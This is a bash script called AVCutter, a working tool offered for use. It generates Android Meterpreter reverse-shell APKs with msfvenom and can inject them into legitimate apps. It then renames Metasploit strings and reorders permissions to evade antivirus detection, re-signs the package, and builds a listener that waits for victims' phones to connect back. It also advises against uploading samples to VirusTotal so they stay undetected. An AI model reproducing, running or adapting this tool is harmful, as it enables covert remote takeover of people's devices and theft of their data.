#!/bin/bash
#                             WELCOME TO AVCutter
#________________________________________________________________________________________
#                          THE INDIAN CYBER SEC TEAM                                     |
#                 generat payloads with AV bypass for Android                            |
#                          bypassed: Kaspersky, AVG                                      |
#________________________________________________________________________________________|

### Input argument variables // setting default values ###
PAYLOAD="android/meterpreter/reverse_https"
LHOST=$(ifconfig eth0 | grep 'inet' | cut -d: -f2 | awk '{print $2}')
LPORT="443"
VERBOSE=0
DEBUG=0
inFile=""
outFile="AndroidService.apk"
willRun=0   

### Variables used for the Cutting process ###
fullPath=$outFile
APK=$(basename $fullPath)
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
JAR=$(which apktool.jar)
apkName=$(echo $APK | cut -f 1 -d '.')
localAddresses=$(ifconfig | grep 'inet' | cut -d: -f2 | awk '{print $2}')
localAddArray=($localAddresses)

### Basic user input checks ###
if [[ $# -eq 0 ]] ; then
    AVCutter -h
    exit 0
fi

### Method simply used for masking output ###
redirect() {
    if [ $VERBOSE -eq 0 ]; then
        "$@" &> /dev/null
    else
        "$@"
    fi
}

### Method for generating the listener script ###
createListener() {
	echo -e "\033[34m [-] \x1B[0m Generating an msf listener script"
	echo "use multi/handler" > /tmp/$apkName.listener
	echo "set payload $PAYLOAD" >> /tmp/$apkName.listener
	isLocal=$(ifconfig | grep -cs $LHOST)
	if [[ $isLocal != 1 ]]
	then
	    echo -e "\033[36m [-] \x1B[0m Unable to find the LHOST address on the local machine."
	    localAddArray+=($LHOST)
	    for ((i = 0; i < ${#localAddArray[@]}; ++i)); do
		position=$(( $i ))
		echo -e " \t[$position]  ${localAddArray[$i]}"
	    done
	    read -r -p " [-]  Which address do you wish to place in the listener script? " userSelectedAdd
	    if [ $userSelectedAdd -eq $userSelectedAdd 2>/dev/null ] && [ $userSelectedAdd -lt ${#localAddArray[@]} ] && [ $userSelectedAdd -ge 0 ]
	    then
		    echo -e "\033[32m [-] \x1B[0m Inserting LHOST=${localAddArray[$userSelectedAdd]} into the listener script."
		    LHOST=${localAddArray[$userSelectedAdd]}
	    else
		echo -e "\033[31m [!] \x1B[0m Invalid entry. Will continue the script with LHOST=$LHOST"
	    fi
	fi
	read -r -p " [-]  Add an AutoRunScript? [y/N] " response
	case "$response" in
	    [yY][eE][sS]|[yY]) 
		read -r -p "  >  " autoRunThis
		echo "set AutoRunScript $autoRunThis" >> /tmp/$apkName.listener
		;;
	esac
	echo "set LHOST $LHOST" >> /tmp/$apkName.listener
	echo "set LPORT $LPORT" >> /tmp/$apkName.listener
	echo "set ExitOnSession false" >> /tmp/$apkName.listener
	echo "exploit -j" >> /tmp/$apkName.listener
	echo -e "\033[32m [-] \x1B[0m Listener script has been generated: /tmp/$apkName.listener"
	echo -e "\033[34m [-] \x1B[0m Start listener with: msfconsole -r /tmp/$apkName.listener"

	read -r -p " [-]  Launch listener now? [y/N] " response
	case "$response" in
	    [yY][eE][sS]|[yY]) 
		msfconsole -r /tmp/$apkName.listener 
		;;
	esac
}

### Setting up the input arguments and help information ###
while [ -n "$1" ]; do
	OPT="$1"
	while [ "$OPT" != "-" ] ; do
		case "$OPT" in
			-h* | --help )
				echo -e "
      █████╗ ██╗   ██╗ ██████╗██╗   ██╗████████╗████████╗███████╗██████╗
     ██╔══██╗██║   ██║██╔════╝██║   ██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗
     ███████║██║   ██║██║     ██║   ██║   ██║      ██║   █████╗  ██████╔╝
     ██╔══██║╚██╗ ██╔╝██║     ██║   ██║   ██║      ██║   ██╔══╝  ██╔══██╗
     ██║  ██║ ╚████╔╝ ╚██████╗╚██████╔╝   ██║      ██║   ███████╗██║  ██║
     ╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝
_____________________________________________________________________________
              Author : VENOM SEC || THE INDIAN CYBER SEC TEAM



AVCutter is a simple multicasting script that leverages MSFVenom to generate a payload, APKTool to decompile and rebuild the packages, and simple SED statements for modifying strings that are being flagged by AV's. 

Usage: AVCutter -p android/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -o LegitAndroidApp.apk
Output: <LegitAndroidApp>.apk & <LegitAndroidApp>.listener
Defaults:
	payload=android/meterpreter/reverse_https
	LHOST=<eth0 IP address>
	LPORT=443
	output=AndroidService.apk

Options

  -p | --payload 	<payload>	This sets the payload to be generated by msfvenom.
  -o | --output 	<outfile.apk>	This sets the name of the APK created as well as the output apk file.
  -x | --original	<infile.apk>	Input APK to inject the payload into (later update).
  -g | --generate			Generate a payload using defaults
  -n | --newkey 			Generate a new debug key before signing
  -v | --verbose 			Don't mask output of commands
  -d | --debug				Leaves the /tmp/payload files in place for review
  -h | --help 				Help information


Metasploit's Android Payloads:

android/meterpreter/reverse_http        Run a meterpreter server in Android. Tunnel communication over HTTP
android/meterpreter/reverse_https       Run a meterpreter server in Android. Tunnel communication over HTTPS
android/meterpreter/reverse_tcp         Run a meterpreter server in Android. Connect back stager
android/meterpreter_reverse_http        Connect back to attacker and spawn a Meterpreter shell
android/meterpreter_reverse_https       Connect back to attacker and spawn a Meterpreter shell
android/meterpreter_reverse_tcp         Connect back to the attacker and spawn a Meterpreter shell
android/shell/reverse_http              Spawn a piped command shell (sh). Tunnel communication over HTTP
android/shell/reverse_https             Spawn a piped command shell (sh). Tunnel communication over HTTPS
android/shell/reverse_tcp               Spawn a piped command shell (sh). Connect back stager
				"
				exit 1
				;;
			-p* | --payload )
				willRun=1
				PAYLOAD="$2"
				shift
				;;
			-o* | --output )
				willRun=1
				outFile="$2"
				fullPath=$outFile
				APK=$(basename $fullPath)
				apkName=$(echo $APK | cut -f 1 -d '.')
				shift
				;;
			-g* | --generate )
				willRun=1
				;;
			-x* | --original )
				willRun=1
				inFile="$2"
				shift
				;;
			-v* | --verbose )
				VERBOSE=1
				;;
			-n* | --newkey )
				rm -rf ~/.android/debug.keystore &> /dev/null
				;;
			-d* | --debug )
				DEBUG=1
				;;
			* )
				REMAINS="$REMAINS \"$OPT\""
				break
				;;
		esac
		NEXTOPT="${OPT#-[cfr]}"
		if [ x"$OPT" != x"$NEXTOPT" ] ; then
			OPT="-$NEXTOPT"
		else
			break
		fi
	done
	shift
done
eval set -- $REMAINS

### Grab extra params used for the payload ###
for i in $REMAINS;
do
	param=${i//\"}
	SAVEIFS=$IFS
	IFS=$'='
	params=($param)
	IFS=$SAVEIFS
	if [ ${params[0]} == "LPORT" ]; then
		LPORT=${params[1]}
		willRun=1
	elif [ ${params[0]} == "LHOST" ]; then
		LHOST=${params[1]}
		willRun=1
	fi
done

if [ $willRun -eq 0 ]; then
  exit 1
fi

### To prevent falsely stating the payload was generated successfully ###
redirect rm -rf $outFile

### Generating the MSFVenom payload ###
echo -e "\033[34m [-] \x1B[0m Generating MSFVenom payload"
if [ -z $inFile ]; then
	echo -e "\033[34m [-] \x1B[0m msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $outFile"
	redirect msfvenom -p $PAYLOAD LHOST\=$LHOST LPORT\=$LPORT -o $outFile
else 
	# As MSFVenom's '-x' option appears to already handle most of the things handled here
	# we will simply pass your information over to let it handle the injection.
	# In the future if things change, then we can continue working with the output.
	echo -e "\033[34m [-] \x1B[0m msfvenom -x $inFile -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT"
	echo -e "\033[34m [-] \x1B[0m This may take some time. To see the output from MSFVenom run the script with --verbose."
	redirect msfvenom -p $PAYLOAD LHOST\=$LHOST $LPORT\=LPORT -x $inFile -o injected_$inFile
	
	# MSFVenom -x is prone to fail due to many reasons (dependencies, unable to inject).
	# Checking to make sure there was a payload generated.
	if [ ! -f injected_$inFile ]; then
	    echo -e "\033[31m [!] \x1B[0m MSFVenom payload generation failed. Run with verbose for more information on the MSFVenom output."
	else
	    echo -e "\033[32m [-] \x1B[0m MSFVenom payload generated: injected_$inFile"
	fi

	# Mainly just for renaming the listener file as this wasn't well thought out beforehand lol.. 
	apkName=$(basename $inFile)

	# Quick fix for added the injection was to make the listener script piece a method
	createListener

	# Not doing anything else with msfvenom -x as it is pretty boss as is.
	exit 1
fi

### Exit if there was no file generated. ###
if [ ! -f $outFile ]; then
	echo -e "\033[31m [!] \x1B[0m MSFVenom payload generation failed."
	exit 1
else
	echo -e "\033[32m [-] \x1B[0m MSFVenom payload successfully generated."
	echo -e "\033[34m [-] \x1B[0m Opening the generated payload with APKTool."
fi

### Checking dependencies ###
type apktool.jar >/dev/null 2>&1 || { 
    echo -e "\033[33m [-] \x1B[0m ApkTool depenency needed... downloading and moving to /usr/local/bin"
    redirect wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.2.4.jar
    mv apktool_2.2.4.jar apktool.jar
    chmod +x apktool.jar
    mv apktool.jar /usr/local/bin/.
}

### APKTool to pull apart the package ###
redirect java -jar $JAR d -f -o /tmp/payload $fullPath

echo -e "\033[34m [-] \x1B[0m Scrubbing the payload contents to avoid AV signatures..."

### Changing the default folder and filenames being flagged by AV ###
mv /tmp/payload/smali/com/metasploit /tmp/payload/smali/com/$VAR1
mv /tmp/payload/smali/com/$VAR1/stage /tmp/payload/smali/com/$VAR1/$VAR2
mv /tmp/payload/smali/com/$VAR1/$VAR2/Payload.smali /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali

### Exit the script if an older payload was generated ###
if [ -f /tmp/payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
    echo -e "\033[31m [!] \x1B[0m An old version of the msfvenom generated payload was detected. Make sure you have everything compeltely updated in Kali! \n\n Older payloads have not been configured in this script to bypass AV. With that, this script still results in a 1/35 on nodistribute.com for the old payloads, but it is not recommended to continue. Ex: # apt-get update && apt-get dist-upgrade"
    exit 1
fi

### Updating path in .smali files ### 
sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
sed -i "s#Payload#$VAR3#g" /tmp/payload/smali/com/$VAR1/$VAR2/*

### Flagged by AV, changed to something not as obvious ### 
sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
sed -i "s#payload#$VAR7#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" /tmp/payload/AndroidManifest.xml
sed -i "s#metasploit#$VAR8#" /tmp/payload/AndroidManifest.xml
sed -i "s#MainActivity#$apkName#" /tmp/payload/res/values/strings.xml

### Re-arranging the permissions, which were being flagged if in perfect order ###
sed -i '/.SET_WALLPAPER/d' /tmp/payload/AndroidManifest.xml
sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' /tmp/payload/AndroidManifest.xml
echo -e "\033[34m [-] \x1B[0m Finished scrubbing the content. Rebuilding the package with APKTool."

### Rebuild the package using APKTool ###
redirect java -jar $JAR b /tmp/payload
echo -e "\033[34m [-] \x1B[0m Washed package created: $outFile"
mv /tmp/payload/dist/$APK $outFile

### Signing the package ###
echo -e "\033[34m [-] \x1B[0m Checking for ~/.android/debug.keystore for signing"
if [ ! -f ~/.android/debug.keystore ]; then
    echo -e "\033[33m [-] \x1B[0m Debug key not found. Generating one now."
    if [ ! -d "~/.android" ]; then
      redirect mkdir ~/.android
    fi
    keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
fi
echo -e "\033[34m [-] \x1B[0m Attempting to sign the package with your android debug key"
redirect jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $outFile androiddebugkey
echo -e "\033[32m [-] \x1B[0m Signed the .apk file with ~/.android/debug.keystore"
echo -e "\033[34m [-] \x1B[0m To generate a new key per package use the '-n' option"
echo -e "\033[34m [-] \x1B[0m Cleaning up "
if [ $DEBUG != 1 ]; then
	rm -rf /tmp/payload
fi
echo -e "\033[32m [-] \x1B[0m Finished generating the payload."
echo -e "\033[33m [-] \x1B[0m Please do not upload the AVCutted/injected files to VirusTotal.com"
echo -e "\033[36m [-] \x1B[0m Use nodistribute.com, or manual scanning on a device."

# Call the method to generate the listener.rc file
createListener

# Output the random smali file structure generated. Useful for those installing and launching with ADB
echo -e "\033[34m [?] \x1B[0m Smali file structure: com.$VAR1.$VAR2"
